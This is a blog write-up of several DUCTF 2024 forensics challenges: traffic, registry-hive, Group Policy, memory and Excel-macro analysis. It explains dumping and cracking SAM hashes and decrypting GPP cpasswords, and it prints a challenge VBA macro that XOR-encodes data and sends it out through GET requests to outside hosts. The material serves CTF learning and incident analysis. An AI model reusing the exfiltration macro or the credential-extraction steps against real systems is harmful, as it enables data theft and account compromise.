---
layout: post
title: DUCTF 2024 - Forensic 
description: All solved forensic challenges
tags: [DUCTF, Writeup, Forensic, DFIR, CTFtime, Blue Team, Memory Forensic, Network Forensic]
---

Hi everyone, this time our team joined DUCTF 2024 and we got 27th place. This time I was busy because of preparing for the exam so I could not solve it with my teammates. However, I tried to solve some challenges by myself and fortunately I solved them. And now it's my writeup for all forensic challenges that I solved!. Let's go!

### Baby's First Forensics
They gave us a pcap file and we need to find out which tool attacker used to exploit our server. If you tried to learn Red team, you would know that when you used some tools to attack, profile of that tool would be stored in User-Agent. 
Back to our problem, look into HTTP traffic, you can see that someone tried to access many directories in a short time:

![image](https://github.com/odintheprotector/odintheprotector.github.io/assets/75618225/129f73bf-9d79-46ec-b8c9-ebdd2dfd9797)

That's the sign of being attacked. Watch its stream and you can find out **Nikto/2.1.6** is the tool was used by attacker:

![image](https://github.com/odintheprotector/odintheprotector.github.io/assets/75618225/914e3e36-5e46-47b1-ac2a-bec6f3cb7898)

**Flag: DUCTF{Nikto/2.1.6}**

### SAM I AM 

For this challenge it's easy, they gave us two files: SAM and SYSTEM and we need to find out Admin password. For this you can use **samdump2** to dump all credentials inside: 

![image](https://github.com/odintheprotector/odintheprotector.github.io/assets/75618225/2f9b14bd-09b1-4eb0-a456-0a6f710c6ee1)

From here you can use **john** or some online tools to decrypt these hashes: 

![image](https://github.com/odintheprotector/odintheprotector.github.io/assets/75618225/37ab4c94-e186-45c5-9b6d-1970671c1063)

**Flag: DUCTF{!checkerboard1}**

### Bad Policies

As the name, our flag will be something related to Policy, and in the detail they mentioned about Domain Controller, I thought about Windows Domain Controller Group Policy which is the management feature that allows network administrators to define and enforce specific settings, configurations, and security policies for users and machines within a Windows-based network. 
Also I found an interesting [article](https://www.mindpointgroup.com/blog/privilege-escalation-via-group-policy-preferences-gpp) about this. Shortly, it mentioned about how they use Group Policy for privilege escalation, and they mentioned about **group.xml** which contains **cpassword**. 
A cpassword is a component of Active Directory's Group Policy Preferences that allows administrators to set passwords via Group Policy. 

And now I will tell you how I solve this problem:
- Find group.xml. I found that file in **badpolicies\badpolicies\rebels.ductf\Policies\{B6EF39A3-E84F-4C1D-A032-00F042BE99B5}\Machine\Preferences\Groups**.

![image](https://github.com/odintheprotector/odintheprotector.github.io/assets/75618225/bc4d3f72-a894-4294-b79d-c03c929baaca)

- Decrypt cpassword, I use this [tool](https://github.com/t0thkr1s/gpp-decrypt) to decrypt cpassword.

![image](https://github.com/odintheprotector/odintheprotector.github.io/assets/75618225/a9dd8cc9-4107-4164-9619-800bf2a27a86)

**Flag: DUCTF{D0n7_Us3_P4s5w0rds_1n_Gr0up_P0l1cy}** 

### Lost in Memory

They gave us a memory file, as usual, I checked list of processes: 

![image](https://github.com/odintheprotector/odintheprotector.github.io/assets/75618225/f88af3a7-d2f0-4132-a898-d662ffc15dcf)

From here you can see that **powershell.exe** and **notepad.exe** were running, which are very suspicious. After that I checked command history:

![image](https://github.com/odintheprotector/odintheprotector.github.io/assets/75618225/af226bf3-fead-4fab-89ab-f7f13e28de7a)

They executed two files: **Monke.xlsm**, **monkey.doc.ps1** and ps1 file was the most suspicious. I extracted it to my machine:

![image](https://github.com/odintheprotector/odintheprotector.github.io/assets/75618225/33c4bf3f-70de-4d14-a862-14ad11c5d09f)

Read its content, it would download **reflect.ps1** and they use **Invoke-ReflectivePEInjection** module. Back to previous image, you can see ps1 file was opened by notepad, so the module would load two DLL files to notepad.exe. Each time you open your computer, malware will be run. 
From this I had an idea to know which command was executed:

- Dump **notepad.exe** process
- Change it to .data file
- Load it to GIMP to generate computer screen at that time (this technique I mentioned in previous writeups)

After a long time, I can see screen at that time but it's still hard to see:

![image](https://github.com/odintheprotector/odintheprotector.github.io/assets/75618225/80f21495-834d-4982-9b93-4fda966f7e76)

If this way is not worked, you can try to string dumped data and I found a Powershell command by that method: 

![image](https://github.com/odintheprotector/odintheprotector.github.io/assets/75618225/c22f1ec7-78e6-4dcf-a396-a4bbfe951750)

If you look carefully you can guess easily that it executed a command that was reversed, so I wrote a Python script to reverse that string: 

![image](https://github.com/odintheprotector/odintheprotector.github.io/assets/75618225/d03514bf-4294-42e1-aa54-899ff4b7299c)

You can see that hacker created **admin** account with password is **5up3r-5ecur3**, because it's from notepad and as I mentioned before, DLLs was loaded to notepad.exe, so that means DLLs created a new account, and we found all parts of the flag!

**Flag: DUCTF{monkey.doc.ps1_Invoke-ReflectivePEInjection_emu.dll-kiwi.dll_5up3r-5ecur3}**

### Macro Magic: 

In this challenge they gave us two files: **Monke.xlsm**, **Capture.pcapng**. First, I analysed Monke.xlsm by extracting VBA code inside it: 

```
Sub macro1()
    Dim Path As String
    Dim wb As Workbook
    Dim A As String
    Dim B As String
    Dim C As String
    Dim D As String
    Dim E As String
    Dim F As String
    Dim G As String
    Dim H As String
    Dim J As String
    Dim K As String
    Dim L As String
    Dim M As String
    Dim N As String
    Dim O As String
    Dim P As String
    Dim Q As String
    Dim R As String
    Dim S As String
    Dim T As String
    Dim U As String
    Dim V As String
    Dim W As String
    Dim X As String
    Dim Y As String
    Dim Z As String
    Dim I As Long
    N = importantThing()
    K = "Yes"
    S = "Mon"
    U = forensics(K)
    V = totalyFine(U)
    D = "Ma"
    J = "https://play.duc.tf/" + V
    superThing (J)
    J = "http://flag.com/"
    superThing (J)
    G = "key"
    J = "http://play.duc.tf/"
    superThing (J)
    J = "http://en.wikipedia.org/wiki/Emu_War"
    superThing (J)
    N = importantThing()
    Path = ThisWorkbook.Path & "\flag.xlsx"
    Set wb = Workbooks.Open(Path)
    Dim valueA1 As Variant
    valueA1 = wb.Sheets(1).Range("A1").Value
    MsgBox valueA1
    wb.Close SaveChanges:=False
    F = "gic"
    N = importantThing()
    Q = "Flag: " & valueA1
    H = "Try Harder"
    U = forensics(H)
    V = totalyFine(U)
    J = "http://downunderctf.com/" + V
    superThing (J)
    W = S + G + D + F
    O = doThing(Q, W)
    M = anotherThing(O, W)
    A = something(O)
    Z = forensics(O)
    N = importantThing()
    P = "Pterodactyl"
    U = forensics(P)
    V = totalyFine(U)
    J = "http://play.duc.tf/" + V
    superThing (J)
    T = totalyFine(Z)
    MsgBox T
    J = "http://downunderctf.com/" + T
    superThing (J)
    N = importantThing()
    E = "Forensics"
    U = forensics(E)
    V = totalyFine(U)
    J = "http://play.duc.tf/" + V
    superThing (J)
    
End Sub
```

You can see that there're so many functions inside, and this function maybe related to pcapng file: 

```
Public Function superThing(ByVal A As String) As String
    With CreateObject("MSXML2.ServerXMLHTTP.6.0")
        .Open "GET", A, False
        .Send
        superThing = StrConv(.responseBody, vbUnicode)
    End With
End Function
```

Open Wireshark and check HTTP traffic and I found the traffic that was generated by this function: 

![image](https://github.com/odintheprotector/odintheprotector.github.io/assets/75618225/747a4150-f084-4295-ab60-1ed54ab7e3b0)

You can see these directories look like ASCII code, back to source code, I found two functions were responsible for decrypt them:

```
Public Function totalyFine(A As String) As String
    Dim B As String
    B = Replace(A, " ", "-")
    totalyFine = B
End Function
```

```
Public Function forensics(B As String) As String
    Dim A() As Byte
    Dim I As Integer
    Dim C As String
    A = StrConv(B, vbFromUnicode)
    For I = LBound(A) To UBound(A)
        C = C & CStr(A(I)) & " "
    Next I
    C = Trim(C)
    forensics = C
End Function
```


These functions will remove "-" character, replace it by " ", calculate ASCII value and we got raw data: 

![image](https://github.com/odintheprotector/odintheprotector.github.io/assets/75618225/3207cfc8-a6b2-4a89-be0f-21560a2e0a89)

![image](https://github.com/odintheprotector/odintheprotector.github.io/assets/75618225/e033b2ff-0ba9-4554-827e-1964609ab394)

Do the same with other directories, I got a data that not human-readable: 

![image](https://github.com/odintheprotector/odintheprotector.github.io/assets/75618225/9968734f-b594-41db-a92f-eb20c0d13459)

Read source code again, I found XOR algorithm in **doThing()** function:

```
Public Function doThing(B As String, C As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(B)
        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))
    Next I
    doThing = A
End Function

Q = "Flag: " & valueA1
W = S + G + D + F
O = doThing(Q, W)
```

I could be sure that flag would be here, so I just needed key and I would get everything. You can see that in **doThing()** function, Q^W will encrypt the flag, so we just take our data xor with key and we would get the flag.
With key you can check it by yourself by following variables that mentioned in **W** variables, after that we will get key is **MonkeyMagic**. From here I wrote a Python script for decoding:

```
def xor_encrypt_decrypt(input_string, key):
    key_list = [ord(char) for char in key]
    key_length = len(key_list)
    output = ''.join(chr(ord(input_string[i]) ^ key_list[i % key_length]) for i in range(len(input_string)))
    return output

key = "MonkeyMagic"
a = "11-3-15-12-95-89-9-52-36-61-37-54-34-90-15-86-38-26-80-19-1-60-12-38-49-9-28-38-0-81-9-2-80-52-28-19"
flag = ""
for i in a.split("-"):
    flag += chr(int(i))

decrypted_string = xor_encrypt_decrypt(flag, key)
print(f"Decrypted: {decrypted_string}")
```

![image](https://github.com/odintheprotector/odintheprotector.github.io/assets/75618225/44345391-54c8-44ce-bc5a-7867459fd4bf)

**Flag: DUCTF{M4d3_W1th_AI_by_M0nk3ys}**
